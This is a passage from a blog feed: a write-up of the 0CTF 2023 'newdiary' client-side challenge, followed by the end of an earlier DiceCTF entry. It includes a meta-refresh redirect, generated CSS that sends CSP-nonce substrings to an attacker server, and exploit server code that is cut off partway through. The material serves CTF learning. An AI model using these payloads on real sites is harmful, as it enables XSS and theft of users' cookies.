&lt;p&gt;All challenge source code provided by the organizers can be found at: &lt;a href=&quot;https://github.com/dicegang/dicectf-quals-2024-challenges&quot;&gt;https://github.com/dicegang/dicectf-quals-2024-challenges&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Keyword list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;crash chromium&lt;/li&gt;
&lt;li&gt;slower css style&lt;/li&gt;
&lt;li&gt;xsleak&lt;/li&gt;
&lt;li&gt;URL length limit&lt;/li&gt;
&lt;li&gt;service worker&lt;/li&gt;
&lt;li&gt;background fetch&lt;/li&gt;
&lt;li&gt;connection pool + css injection&lt;/li&gt;
&lt;li&gt;iframe width + css injection&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>0CTF 2023 Writeups</title>
    <link href="https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/12/11/en/0ctf-2023-writeup/</id>
    <published>2023-12-11T04:40:00.000Z</published>
    <updated>2023-12-11T14:59:37.981Z</updated>
    
    <content type="html"><![CDATA[<p>This year’s 0CTF had a total of three web challenges, one of which was client-side. I only solved this particular challenge and managed to get the first blood. This post will briefly document my solution.</p><p>Keyword list:</p><ol><li>CSS injection</li><li>CSS exfiltration</li></ol><span id="more"></span><h2><span id="web-newdiary-14-solves">Web - newdiary (14 solves)</span></h2><p>The challenge is a typical note-taking app where you can create notes and report them to an admin bot. The notes have a length restriction but no filtering is applied. The client-side uses innerHTML directly, so HTML injection is evident:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">load</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">const</span> param <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> username <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[0-9a-f]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/share/read/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> data<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">const</span> title <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                title<span class="token punctuation">.</span>innerText <span class="token operator">=</span> data<span class="token punctuation">.</span>title<span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">const</span> content <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                content<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> data<span class="token punctuation">.</span>content<span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/share/read/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">?username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> data<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">const</span> title <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                title<span class="token punctuation">.</span>innerText <span class="token operator">=</span> data<span class="token punctuation">.</span>title<span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">const</span> content <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                content<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> data<span class="token punctuation">.</span>content<span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>        document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"report"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>href <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/report?id=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    window<span class="token punctuation">.</span><span class="token function">removeEventListener</span><span class="token punctuation">(</span><span class="token string">'hashchange'</span><span class="token punctuation">,</span> load<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'hashchange'</span><span class="token punctuation">,</span> load<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>One important thing to note here is that changing the hash will load a new note, which is crucial.</p><p>As for the Content Security Policy (CSP), it is as follows:</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span>    <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'nonce-&lt;%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>Each response has a different nonce, which is 32 characters long and consists of alphanumeric characters (a-zA-Z0-9), totaling 36 possible combinations. Inline and unpkg styles are allowed for CSS since unpkg retrieves files from npm, making it equivalent to allowing any external style.</p><p>The admin bot can only access <code>/share/read</code> and will stay there for 30 seconds. This timeout is likely intended to leak something over time:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">goto</span><span class="token punctuation">(</span>  <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost/share/read#id=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span> <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">5000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">await</span> <span class="token keyword">new</span> <span class="token class-name">Promise</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">resolve</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>resolve<span class="token punctuation">,</span> <span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">await</span> page<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>By the way, the flag is in the cookie, so the goal is to achieve XSS.</p><p>After reading the challenge, it seemed quite intuitive to me. It was clear that I needed to find a way to steal the nonce using CSS, create a new note after stealing the nonce, and then change the hash to load the new note, thus achieving XSS.</p><p>However, there are some small details to consider. For example, the admin bot can only access a specific note, so I needed to use <code>&lt;meta&gt;</code> redirect to my own server first, and then use <code>window.open</code> to open the new note. This way, after stealing the nonce, I could update the content by changing the hash, ensuring that the nonce remains unchanged.</p><p>In summary, the process is as follows:</p><ol><li>Add a note(id: 0) with the content <code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=https://my_server&quot;&gt;</code>.</li><li>Add another note(id: 1) with the content <code>&lt;style&gt;@import &quot;https://unpkg.com/pkg/steal.css&quot;&lt;/style&gt;</code>.</li><li>Make the admin bot access the note with id 0.</li><li>The admin bot will be redirected to my server, where I can execute arbitrary JavaScript in my origin.</li><li>Execute <code>w = window.open(note_id_1)</code> to start stealing the nonce.</li><li>Obtain the stolen nonce.</li><li>Add the final note(id: 2) with the content <code>&lt;script nonce=xxx&gt;&lt;/script&gt;</code></li><li>Execute <code>w.location = &#39;.../share/read#id=2&#39;</code>.</li><li>XSS.</li></ol><p>The trickiest part in this process is stealing the nonce using CSS.</p><h3><span id="stealing-the-nonce-with-css">Stealing the Nonce with CSS</span></h3><p>I had previously researched using CSS to steal data: <a href="https://blog.huli.tw/2022/09/29/en/css-injection-1/">Stealing Data with CSS - CSS Injection (Part 1)</a>. However, the methods mentioned in that article are not applicable to this challenge.</p><p>Due to the large number of possible nonces, the fastest way is to steal them character by character. However, this approach requires using <code>@import</code> with a blocking method. In this challenge, external links are limited to unpkg, which only hosts static files and does not support this method.</p><p>Another method I recently came across but haven’t updated in my article yet is: <a href="mails-in-proton-mail/#splitting-the-url-into-smaller-chunks">Code Vulnerabilities Put Proton Mails at Risk</a></p><p>This approach is quite clever, dividing a piece of text into many small substrings, each containing three characters. We generate all permutations of three characters from a-zA-Z0-9, like this:</p><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">script[nonce*="aaa"]</span><span class="token punctuation">&#123;</span><span class="token property">--aaa</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"https://server/leak?q=aaa"</span><span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span class="token selector">script[nonce*="aab"]</span><span class="token punctuation">&#123;</span><span class="token property">--aab</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"https://server/leak?q=aab"</span><span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span class="token selector">...script[nonce*="ZZZ"]</span><span class="token punctuation">&#123;</span><span class="token property">--ZZZ</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span><span class="token string url">"https://server/leak?q=ZZZ"</span><span class="token punctuation">)</span></span><span class="token punctuation">&#125;</span><span class="token selector">script</span><span class="token punctuation">&#123;</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>  <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">-webkit-cross-fade</span><span class="token punctuation">(</span>    <span class="token function">var</span><span class="token punctuation">(</span>--aaa<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token function">-webkit-cross-fade</span><span class="token punctuation">(</span>      <span class="token function">var</span><span class="token punctuation">(</span>--aab<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">var</span><span class="token punctuation">(</span>--ZZZ<span class="token punctuation">,</span> none<span class="token punctuation">)</span><span class="token punctuation">,</span> 50%    <span class="token punctuation">)</span><span class="token punctuation">,</span>    50%  <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Using <code>-webkit-cross-fade</code> is for loading multiple images. You can refer to the article posted above for more details.</p><p>For example, if the nonce is abc123, the server will receive:</p><ol><li>abc</li><li>bc1</li><li>c12</li><li>123</li></ol><p>These four strings may have different orders, but as long as they are combined according to the rules, we can obtain abc123. Of course, there may be multiple combinations or uncertain beginnings and endings, but we can treat them as edge cases and try again.</p><p>By stealing the nonce in this way, for this problem, there will be 36^3 &#x3D; 46656 rules, which is an acceptable length.</p><h3><span id="generating-css">Generating CSS</span></h3><p>Coincidentally, I encountered a similar situation at work before, so I already have a script ready, just need to make some modifications.</p><p>If we apply all the rules to the same element in this problem, it seems that Chrome will crash due to too many rules (at least that’s what happened on my local machine). So I divided the rules into three parts and applied them to three different elements.</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">let</span> chars <span class="token operator">=</span> <span class="token string">'abcdefghijklmnopqrstuvwxyz0123456789'</span><span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token string">'https://ip.ngrok-free.app'</span><span class="token keyword">let</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> a <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> b <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> c <span class="token keyword">of</span> chars<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">let</span> str <span class="token operator">=</span> a<span class="token operator">+</span>b<span class="token operator">+</span>c<span class="token punctuation">;</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">let</span> payload1 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">let</span> crossPayload1 <span class="token operator">=</span> <span class="token string">'url("/")'</span><span class="token keyword">let</span> payload2 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">let</span> crossPayload2 <span class="token operator">=</span> <span class="token string">'url("/")'</span><span class="token keyword">let</span> payload3 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">let</span> crossPayload3 <span class="token operator">=</span> <span class="token string">'url("/")'</span><span class="token keyword">const</span> third <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> arr1 <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> third<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">const</span> arr2 <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span>third<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">*</span> third<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">const</span> arr3 <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">2</span> <span class="token operator">*</span> third<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> arr1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    payload1 <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">script[nonce*="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"]&#123;--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/leak?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")&#125;\n</span><span class="token template-punctuation string">`</span></span>    crossPayload1 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-webkit-cross-fade(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, var(--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, none), 50%)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> arr2<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    payload2 <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">script[nonce*="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"]&#123;--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/leak?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")&#125;\n</span><span class="token template-punctuation string">`</span></span>    crossPayload2 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-webkit-cross-fade(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, var(--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, none), 50%)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> str <span class="token keyword">of</span> arr3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    payload3 <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">script[nonce*="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"]&#123;--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">:url("</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/leak?q=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">")&#125;\n</span><span class="token template-punctuation string">`</span></span>    crossPayload3 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">-webkit-cross-fade(</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload3<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, var(--</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>str<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">, none), 50%)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span>payload1 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> script&#123;display:block;&#125; script&#123;background-image: </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload1<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&#125;</span><span class="token template-punctuation string">`</span></span>payload2 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">script:after&#123;content:'a';display:block;background-image:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload2<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> &#125;</span><span class="token template-punctuation string">`</span></span>payload3 <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>payload3<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">script:before&#123;content:'a';display:block;background-image:</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>crossPayload3<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string"> &#125;</span><span class="token template-punctuation string">`</span></span>fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'exp1.css'</span><span class="token punctuation">,</span> payload1<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'exp2.css'</span><span class="token punctuation">,</span> payload2<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>fs<span class="token punctuation">.</span><span class="token function">writeFileSync</span><span class="token punctuation">(</span><span class="token string">'exp3.css'</span><span class="token punctuation">,</span> payload3<span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Then publish the completed file to npm to get a URL on unpkg.</p><h3><span id="exploit">Exploit</span></h3><p>The code is a bit messy and I’m too lazy to organize it, but basically, after running it, accessing <code>/start</code> will automatically start the entire process.</p><p>Fortunately, I had read that article before, so I roughly knew how to solve it half an hour after the competition started. I spent the remaining two hours writing code 😆</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> express <span class="token keyword">from</span> <span class="token string">'express'</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span>fetch<span class="token punctuation">,</span> CookieJar<span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"node-fetch-cookies"</span><span class="token punctuation">;</span><span class="token keyword">const</span> app <span class="token operator">=</span> <span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">const</span> port <span class="token operator">=</span> <span class="token number">3000</span><span class="token keyword">const</span> host <span class="token operator">=</span> <span class="token string">'http://new-diary.ctf.0ops.sjtu.cn'</span><span class="token keyword">const</span> selfHost <span class="token operator">=</span> <span class="token string">'https://ip.ngrok-free.app'</span><span class="token keyword">const</span> cssUrl <span class="token operator">=</span> <span class="token string">'https://unpkg.com/your_pkg@1.0.0'</span><span class="token keyword">const</span> <span class="token function-variable function">getRandomStr</span> <span class="token operator">=</span> <span class="token parameter">len</span> <span class="token operator">=></span> <span class="token function">Array</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">_</span> <span class="token operator">=></span> Math<span class="token punctuation">.</span><span class="token function">floor</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">let</span> leaks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">let</span> cookieJar <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CookieJar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">let</span> username <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">let</span> hasToken <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">mergeWords</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> ending</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token 